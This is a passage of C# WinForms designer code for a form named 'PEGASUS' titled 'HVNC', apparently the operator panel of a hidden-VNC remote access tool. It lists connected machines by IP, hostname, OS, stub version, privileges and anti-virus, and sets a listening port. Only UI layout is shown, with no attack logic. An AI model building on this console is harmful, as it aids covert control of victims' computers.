			imageList1.Images.SetKeyName(4, "ai.png");
			imageList1.Images.SetKeyName(5, "al.png");
			imageList1.Images.SetKeyName(6, "am.png");
			imageList1.Images.SetKeyName(7, "an.png");
			imageList1.Images.SetKeyName(8, "ao.png");
			imageList1.Images.SetKeyName(9, "ar.png");
			imageList1.Images.SetKeyName(10, "as.png");
			imageList1.Images.SetKeyName(11, "at.png");
			imageList1.Images.SetKeyName(12, "au.png");
			imageList1.Images.SetKeyName(13, "aw.png");
			imageList1.Images.SetKeyName(14, "ax.png");
			imageList1.Images.SetKeyName(15, "az.png");
			imageList1.Images.SetKeyName(16, "ba.png");
			imageList1.Images.SetKeyName(17, "bb.png");
			imageList1.Images.SetKeyName(18, "bd.png");
			imageList1.Images.SetKeyName(19, "be.png");
			imageList1.Images.SetKeyName(20, "bf.png");
			imageList1.Images.SetKeyName(21, "bg.png");
			imageList1.Images.SetKeyName(22, "bh.png");
			imageList1.Images.SetKeyName(23, "bi.png");
			imageList1.Images.SetKeyName(24, "bj.png");
			imageList1.Images.SetKeyName(25, "bm.png");
			imageList1.Images.SetKeyName(26, "bn.png");
			imageList1.Images.SetKeyName(27, "bo.png");
			imageList1.Images.SetKeyName(28, "br.png");
			imageList1.Images.SetKeyName(29, "bs.png");
			imageList1.Images.SetKeyName(30, "bt.png");
			imageList1.Images.SetKeyName(31, "bv.png");
			imageList1.Images.SetKeyName(32, "bw.png");
			imageList1.Images.SetKeyName(33, "by.png");
			imageList1.Images.SetKeyName(34, "bz.png");
			imageList1.Images.SetKeyName(35, "ca.png");
			imageList1.Images.SetKeyName(36, "catalonia.png");
			imageList1.Images.SetKeyName(37, "cc.png");
			imageList1.Images.SetKeyName(38, "cd.png");
			imageList1.Images.SetKeyName(39, "cf.png");
			imageList1.Images.SetKeyName(40, "cg.png");
			imageList1.Images.SetKeyName(41, "ch.png");
			imageList1.Images.SetKeyName(42, "ci.png");
			imageList1.Images.SetKeyName(43, "ck.png");
			imageList1.Images.SetKeyName(44, "cl.png");
			imageList1.Images.SetKeyName(45, "cm.png");
			imageList1.Images.SetKeyName(46, "cn.png");
			imageList1.Images.SetKeyName(47, "co.png");
			imageList1.Images.SetKeyName(48, "cr.png");
			imageList1.Images.SetKeyName(49, "cs.png");
			imageList1.Images.SetKeyName(50, "cu.png");
			imageList1.Images.SetKeyName(51, "cv.png");
			imageList1.Images.SetKeyName(52, "cx.png");
			imageList1.Images.SetKeyName(53, "cy.png");
			imageList1.Images.SetKeyName(54, "cz.png");
			imageList1.Images.SetKeyName(55, "de.png");
			imageList1.Images.SetKeyName(56, "dj.png");
			imageList1.Images.SetKeyName(57, "dk.png");
			imageList1.Images.SetKeyName(58, "dm.png");
			imageList1.Images.SetKeyName(59, "do.png");
			imageList1.Images.SetKeyName(60, "dz.png");
			imageList1.Images.SetKeyName(61, "ec.png");
			imageList1.Images.SetKeyName(62, "ee.png");
			imageList1.Images.SetKeyName(63, "eg.png");
			imageList1.Images.SetKeyName(64, "eh.png");
			imageList1.Images.SetKeyName(65, "england.png");
			imageList1.Images.SetKeyName(66, "er.png");
			imageList1.Images.SetKeyName(67, "es.png");
			imageList1.Images.SetKeyName(68, "et.png");
			imageList1.Images.SetKeyName(69, "europeanunion.png");
			imageList1.Images.SetKeyName(70, "fam.png");
			imageList1.Images.SetKeyName(71, "fi.png");
			imageList1.Images.SetKeyName(72, "fj.png");
			imageList1.Images.SetKeyName(73, "fk.png");
			imageList1.Images.SetKeyName(74, "fm.png");
			imageList1.Images.SetKeyName(75, "fo.png");
			imageList1.Images.SetKeyName(76, "fr.png");
			imageList1.Images.SetKeyName(77, "ga.png");
			imageList1.Images.SetKeyName(78, "gb.png");
			imageList1.Images.SetKeyName(79, "gd.png");
			imageList1.Images.SetKeyName(80, "ge.png");
			imageList1.Images.SetKeyName(81, "gf.png");
			imageList1.Images.SetKeyName(82, "gh.png");
			imageList1.Images.SetKeyName(83, "gi.png");
			imageList1.Images.SetKeyName(84, "gl.png");
			imageList1.Images.SetKeyName(85, "gm.png");
			imageList1.Images.SetKeyName(86, "gn.png");
			imageList1.Images.SetKeyName(87, "gp.png");
			imageList1.Images.SetKeyName(88, "gq.png");
			imageList1.Images.SetKeyName(89, "gr.png");
			imageList1.Images.SetKeyName(90, "gs.png");
			imageList1.Images.SetKeyName(91, "gt.png");
			imageList1.Images.SetKeyName(92, "gu.png");
			imageList1.Images.SetKeyName(93, "gw.png");
			imageList1.Images.SetKeyName(94, "gy.png");
			imageList1.Images.SetKeyName(95, "hk.png");
			imageList1.Images.SetKeyName(96, "hm.png");
			imageList1.Images.SetKeyName(97, "hn.png");
			imageList1.Images.SetKeyName(98, "hr.png");
			imageList1.Images.SetKeyName(99, "ht.png");
			imageList1.Images.SetKeyName(100, "hu.png");
			imageList1.Images.SetKeyName(101, "id.png");
			imageList1.Images.SetKeyName(102, "ie.png");
			imageList1.Images.SetKeyName(103, "il.png");
			imageList1.Images.SetKeyName(104, "in.png");
			imageList1.Images.SetKeyName(105, "io.png");
			imageList1.Images.SetKeyName(106, "iq.png");
			imageList1.Images.SetKeyName(107, "ir.png");
			imageList1.Images.SetKeyName(108, "is.png");
			imageList1.Images.SetKeyName(109, "it.png");
			imageList1.Images.SetKeyName(110, "jm.png");
			imageList1.Images.SetKeyName(111, "jo.png");
			imageList1.Images.SetKeyName(112, "jp.png");
			imageList1.Images.SetKeyName(113, "ke.png");
			imageList1.Images.SetKeyName(114, "kg.png");
			imageList1.Images.SetKeyName(115, "kh.png");
			imageList1.Images.SetKeyName(116, "ki.png");
			imageList1.Images.SetKeyName(117, "km.png");
			imageList1.Images.SetKeyName(118, "kn.png");
			imageList1.Images.SetKeyName(119, "kp.png");
			imageList1.Images.SetKeyName(120, "kr.png");
			imageList1.Images.SetKeyName(121, "kw.png");
			imageList1.Images.SetKeyName(122, "ky.png");
			imageList1.Images.SetKeyName(123, "kz.png");
			imageList1.Images.SetKeyName(124, "la.png");
			imageList1.Images.SetKeyName(125, "lb.png");
			imageList1.Images.SetKeyName(126, "lc.png");
			imageList1.Images.SetKeyName(127, "li.png");
			imageList1.Images.SetKeyName(128, "lk.png");
			imageList1.Images.SetKeyName(129, "lr.png");
			imageList1.Images.SetKeyName(130, "ls.png");
			imageList1.Images.SetKeyName(131, "lt.png");
			imageList1.Images.SetKeyName(132, "lu.png");
			imageList1.Images.SetKeyName(133, "lv.png");
			imageList1.Images.SetKeyName(134, "ly.png");
			imageList1.Images.SetKeyName(135, "ma.png");
			imageList1.Images.SetKeyName(136, "mc.png");
			imageList1.Images.SetKeyName(137, "md.png");
			imageList1.Images.SetKeyName(138, "me.png");
			imageList1.Images.SetKeyName(139, "mg.png");
			imageList1.Images.SetKeyName(140, "mh.png");
			imageList1.Images.SetKeyName(141, "mk.png");
			imageList1.Images.SetKeyName(142, "ml.png");
			imageList1.Images.SetKeyName(143, "mm.png");
			imageList1.Images.SetKeyName(144, "mn.png");
			imageList1.Images.SetKeyName(145, "mo.png");
			imageList1.Images.SetKeyName(146, "mp.png");
			imageList1.Images.SetKeyName(147, "mq.png");
			imageList1.Images.SetKeyName(148, "mr.png");
			imageList1.Images.SetKeyName(149, "ms.png");
			imageList1.Images.SetKeyName(150, "mt.png");
			imageList1.Images.SetKeyName(151, "mu.png");
			imageList1.Images.SetKeyName(152, "mv.png");
			imageList1.Images.SetKeyName(153, "mw.png");
			imageList1.Images.SetKeyName(154, "mx.png");
			imageList1.Images.SetKeyName(155, "my.png");
			imageList1.Images.SetKeyName(156, "mz.png");
			imageList1.Images.SetKeyName(157, "na.png");
			imageList1.Images.SetKeyName(158, "nc.png");
			imageList1.Images.SetKeyName(159, "ne.png");
			imageList1.Images.SetKeyName(160, "nf.png");
			imageList1.Images.SetKeyName(161, "ng.png");
			imageList1.Images.SetKeyName(162, "ni.png");
			imageList1.Images.SetKeyName(163, "nl.png");
			imageList1.Images.SetKeyName(164, "no.png");
			imageList1.Images.SetKeyName(165, "np.png");
			imageList1.Images.SetKeyName(166, "nr.png");
			imageList1.Images.SetKeyName(167, "nu.png");
			imageList1.Images.SetKeyName(168, "nz.png");
			imageList1.Images.SetKeyName(169, "om.png");
			imageList1.Images.SetKeyName(170, "pa.png");
			imageList1.Images.SetKeyName(171, "pe.png");
			imageList1.Images.SetKeyName(172, "pf.png");
			imageList1.Images.SetKeyName(173, "pg.png");
			imageList1.Images.SetKeyName(174, "ph.png");
			imageList1.Images.SetKeyName(175, "pk.png");
			imageList1.Images.SetKeyName(176, "pl.png");
			imageList1.Images.SetKeyName(177, "pm.png");
			imageList1.Images.SetKeyName(178, "pn.png");
			imageList1.Images.SetKeyName(179, "pr.png");
			imageList1.Images.SetKeyName(180, "ps.png");
			imageList1.Images.SetKeyName(181, "pt.png");
			imageList1.Images.SetKeyName(182, "pw.png");
			imageList1.Images.SetKeyName(183, "py.png");
			imageList1.Images.SetKeyName(184, "qa.png");
			imageList1.Images.SetKeyName(185, "re.png");
			imageList1.Images.SetKeyName(186, "ro.png");
			imageList1.Images.SetKeyName(187, "rs.png");
			imageList1.Images.SetKeyName(188, "ru.png");
			imageList1.Images.SetKeyName(189, "rw.png");
			imageList1.Images.SetKeyName(190, "sa.png");
			imageList1.Images.SetKeyName(191, "sb.png");
			imageList1.Images.SetKeyName(192, "sc.png");
			imageList1.Images.SetKeyName(193, "scotland.png");
			imageList1.Images.SetKeyName(194, "sd.png");
			imageList1.Images.SetKeyName(195, "se.png");
			imageList1.Images.SetKeyName(196, "sg.png");
			imageList1.Images.SetKeyName(197, "sh.png");
			imageList1.Images.SetKeyName(198, "si.png");
			imageList1.Images.SetKeyName(199, "sj.png");
			imageList1.Images.SetKeyName(200, "sk.png");
			imageList1.Images.SetKeyName(201, "sl.png");
			imageList1.Images.SetKeyName(202, "sm.png");
			imageList1.Images.SetKeyName(203, "sn.png");
			imageList1.Images.SetKeyName(204, "so.png");
			imageList1.Images.SetKeyName(205, "sr.png");
			imageList1.Images.SetKeyName(206, "st.png");
			imageList1.Images.SetKeyName(207, "sv.png");
			imageList1.Images.SetKeyName(208, "sy.png");
			imageList1.Images.SetKeyName(209, "sz.png");
			imageList1.Images.SetKeyName(210, "tc.png");
			imageList1.Images.SetKeyName(211, "td.png");
			imageList1.Images.SetKeyName(212, "tf.png");
			imageList1.Images.SetKeyName(213, "tg.png");
			imageList1.Images.SetKeyName(214, "th.png");
			imageList1.Images.SetKeyName(215, "tj.png");
			imageList1.Images.SetKeyName(216, "tk.png");
			imageList1.Images.SetKeyName(217, "tl.png");
			imageList1.Images.SetKeyName(218, "tm.png");
			imageList1.Images.SetKeyName(219, "tn.png");
			imageList1.Images.SetKeyName(220, "to.png");
			imageList1.Images.SetKeyName(221, "tr.png");
			imageList1.Images.SetKeyName(222, "tt.png");
			imageList1.Images.SetKeyName(223, "tv.png");
			imageList1.Images.SetKeyName(224, "tw.png");
			imageList1.Images.SetKeyName(225, "tz.png");
			imageList1.Images.SetKeyName(226, "ua.png");
			imageList1.Images.SetKeyName(227, "ug.png");
			imageList1.Images.SetKeyName(228, "um.png");
			imageList1.Images.SetKeyName(229, "us.png");
			imageList1.Images.SetKeyName(230, "uy.png");
			imageList1.Images.SetKeyName(231, "uz.png");
			imageList1.Images.SetKeyName(232, "va.png");
			imageList1.Images.SetKeyName(233, "vc.png");
			imageList1.Images.SetKeyName(234, "ve.png");
			imageList1.Images.SetKeyName(235, "vg.png");
			imageList1.Images.SetKeyName(236, "vi.png");
			imageList1.Images.SetKeyName(237, "vn.png");
			imageList1.Images.SetKeyName(238, "vu.png");
			imageList1.Images.SetKeyName(239, "wales.png");
			imageList1.Images.SetKeyName(240, "wf.png");
			imageList1.Images.SetKeyName(241, "ws.png");
			imageList1.Images.SetKeyName(242, "ye.png");
			imageList1.Images.SetKeyName(243, "yt.png");
			imageList1.Images.SetKeyName(244, "za.png");
			imageList1.Images.SetKeyName(245, "zm.png");
			imageList1.Images.SetKeyName(246, "zw.png");
			guna2DragControl1.DockIndicatorTransparencyValue = 0.6;
			guna2DragControl1.TransparentWhileDrag = true;
			guna2DragControl1.UseTransparentDrag = true;
			imageList2.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imageList2.ImageStream");
			imageList2.TransparentColor = System.Drawing.Color.Transparent;
			imageList2.Images.SetKeyName(0, "connected_480px.png");
			imageList2.Images.SetKeyName(1, "disconnected_480px.png");
			HVNCList.Activation = System.Windows.Forms.ItemActivation.OneClick;
			HVNCList.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			HVNCList.BorderStyle = System.Windows.Forms.BorderStyle.None;
			HVNCList.Columns.AddRange(new System.Windows.Forms.ColumnHeader[10] { columnHeader3, columnHeader2, columnHeader1, columnHeader4, columnHeader5, columnHeader7, columnHeader6, columnHeader8, columnHeader9, columnHeader10 });
			HVNCList.ContextMenuStrip = guna2ContextMenuStrip1;
			HVNCList.Font = new System.Drawing.Font("Electrolize", 8.999999f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
			HVNCList.ForeColor = System.Drawing.Color.White;
			HVNCList.FullRowSelect = true;
			HVNCList.HideSelection = false;
			HVNCList.LabelEdit = true;
			HVNCList.Location = new System.Drawing.Point(2, 75);
			HVNCList.Name = "HVNCList";
			HVNCList.Size = new System.Drawing.Size(1500, 565);
			HVNCList.SmallImageList = imageList1;
			HVNCList.TabIndex = 145;
			HVNCList.UseCompatibleStateImageBehavior = false;
			HVNCList.View = System.Windows.Forms.View.Details;
			HVNCList.DrawItem += new System.Windows.Forms.DrawListViewItemEventHandler(HVNCList_DrawItem);
			HVNCList.DrawSubItem += new System.Windows.Forms.DrawListViewSubItemEventHandler(HVNCList_DrawSubItem);
			columnHeader3.Text = "[IP Address]";
			columnHeader3.Width = 110;
			columnHeader2.Text = "[hVNC Version]";
			columnHeader2.Width = 110;
			columnHeader1.Text = "[Country]";
			columnHeader1.Width = 90;
			columnHeader4.Text = "[Hostname]";
			columnHeader4.Width = 110;
			columnHeader5.Text = "[OS]";
			columnHeader5.Width = 110;
			columnHeader7.Text = "[Stub Version]";
			columnHeader7.Width = 100;
			columnHeader6.Text = "[Active From]";
			columnHeader6.Width = 110;
			columnHeader8.Text = "[Privileges]";
			columnHeader8.Width = 100;
			columnHeader9.Text = "[Anti-Virus]";
			columnHeader9.Width = 110;
			columnHeader10.Text = "[Ping]";
			columnHeader10.Width = 90;
			HVNCListenBtn.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
			HVNCListenBtn.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[3] { portToolStripMenuItem, HVNCListenPort, toolStripSeparator3 });
			HVNCListenBtn.Name = "HVNCListenBtn";
			HVNCListenBtn.Size = new System.Drawing.Size(189, 32);
			HVNCListenBtn.Text = "listening Port";
			HVNCListenBtn.Click += new System.EventHandler(HVNCListenBtn_Click);
			portToolStripMenuItem.Name = "portToolStripMenuItem";
			portToolStripMenuItem.Size = new System.Drawing.Size(160, 22);
			portToolStripMenuItem.Text = "Port :";
			HVNCListenPort.Font = new System.Drawing.Font("Electrolize", 9f);
			HVNCListenPort.Name = "HVNCListenPort";
			HVNCListenPort.Size = new System.Drawing.Size(100, 22);
			HVNCListenPort.Text = "9031";
			toolStripSeparator3.Name = "toolStripSeparator3";
			toolStripSeparator3.Size = new System.Drawing.Size(157, 6);
			guna2VScrollBar1.BindingContainer = HVNCList;
			guna2VScrollBar1.BorderColor = System.Drawing.Color.FromArgb(32, 32, 32);
			guna2VScrollBar1.FillColor = System.Drawing.Color.FromArgb(30, 30, 30);
			guna2VScrollBar1.HoverState.Parent = null;
			guna2VScrollBar1.InUpdate = false;
			guna2VScrollBar1.LargeChange = 10;
			guna2VScrollBar1.Location = new System.Drawing.Point(1484, 75);
			guna2VScrollBar1.Name = "guna2VScrollBar1";
			guna2VScrollBar1.PressedState.Parent = guna2VScrollBar1;
			guna2VScrollBar1.ScrollbarSize = 18;
			guna2VScrollBar1.Size = new System.Drawing.Size(18, 565);
			guna2VScrollBar1.TabIndex = 146;
			guna2VScrollBar1.ThumbColor = System.Drawing.Color.FromArgb(182, 37, 32);
			guna2VScrollBar1.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
			timer1.Interval = 10000;
			timer1.Tick += new System.EventHandler(timer1_Tick);
			btnClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			btnClose.BackColor = System.Drawing.Color.Transparent;
			btnClose.BackgroundImage = (System.Drawing.Image)resources.GetObject("btnClose.BackgroundImage");
			btnClose.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Zoom;
			btnClose.FillColor = System.Drawing.Color.Transparent;
			btnClose.ImageRotate = 0f;
			btnClose.Location = new System.Drawing.Point(1446, 17);
			btnClose.Name = "btnClose";
			btnClose.ShadowDecoration.Parent = btnClose;
			btnClose.Size = new System.Drawing.Size(45, 29);
			btnClose.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
			btnClose.TabIndex = 264;
			btnClose.TabStop = false;
			btnClose.UseTransparentBackground = true;
			btnClose.Click += new System.EventHandler(btnClose_Click);
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(1503, 673);
			base.Controls.Add(btnClose);
			base.Controls.Add(guna2VScrollBar1);
			base.Controls.Add(HVNCList);
			base.Controls.Add(ListenPort);
			base.Controls.Add(label12);
			base.Controls.Add(StartPort);
			base.Controls.Add(statusStrip1);
			base.Controls.Add(label8);
			base.Controls.Add(chkSounds);
			base.Controls.Add(Listener);
			base.Controls.Add(label5);
			base.Controls.Add(guna2PictureBox1);
			base.Controls.Add(label1);
			base.Controls.Add(guna2ControlBox3);
			base.Controls.Add(guna2ControlBox2);
			base.Controls.Add(label2);
			base.Controls.Add(label6);
			base.Controls.Add(label9);
			base.Controls.Add(label13);
			ForeColor = System.Drawing.Color.FromArgb(182, 37, 32);
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "PEGASUS";
			Text = "HVNC";
			base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(PEGASUS_FormClosed);
			base.Load += new System.EventHandler(PEGASUS_Load);
			((System.ComponentModel.ISupportInitialize)guna2PictureBox1).EndInit();
			guna2ContextMenuStrip1.ResumeLayout(false);
			statusStrip1.ResumeLayout(false);
			statusStrip1.PerformLayout();
			((System.ComponentModel.ISupportInitialize)ListenPort).EndInit();
			((System.ComponentModel.ISupportInitialize)btnClose).EndInit();
			ResumeLayout(false);
			PerformLayout();
		}
	}
}
